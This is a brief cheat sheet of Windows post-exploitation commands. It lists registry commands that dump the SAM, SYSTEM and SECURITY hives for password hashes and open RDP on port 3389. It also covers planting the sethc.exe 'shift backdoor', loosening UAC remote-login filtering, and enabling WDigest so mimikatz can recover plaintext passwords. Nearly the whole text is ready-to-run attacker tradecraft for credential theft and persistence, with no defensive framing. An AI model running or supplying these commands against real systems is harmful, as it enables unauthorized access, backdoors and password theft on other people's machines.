some useful commands and scripts in windows.

dump hive hash

dump system hash into .hive file.

use Cain or Impacket to get hash.

reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive

open port 3389

just one command.

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

sethc hijacking

shift backdoor

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

enable remote login access

for domains, because of uac policy

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

use logon credential

to use mimikatz to dump plaintext passwords.

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
